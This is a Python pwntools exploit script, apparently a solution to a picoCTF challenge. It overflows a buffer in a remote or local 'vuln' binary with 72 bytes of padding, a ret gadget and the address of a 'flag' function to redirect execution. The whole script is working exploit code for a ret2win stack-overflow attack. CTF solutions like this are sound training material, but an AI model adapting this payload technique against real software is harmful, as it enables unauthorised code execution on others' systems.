#!/usr/bin/python3

from pwn import *

local = False
filename = './vuln'
hostname = 'saturn.picoctf.net'
port = 51228

if local:
    p = process(filename)
else:
    p = remote(hostname, port)

e = ELF(filename)

print('Functions:')
for function in e.symbols:
    print(f'  {function} function at {hex(e.symbols[function])}')

rop = ROP(e)
print('ROP gadgets:')
for gadget in rop.gadgets:
    print(rop.gadgets[gadget])

offset = 72
ret_gadget = 0x40101a
flag_func_addr = e.symbols['flag']

payload = b'A' * offset
payload += p64(ret_gadget)
payload += p64(flag_func_addr)
result = p.recv(timeout=2)
p.sendline(payload)
result = p.recvall(timeout=2)
print(result)
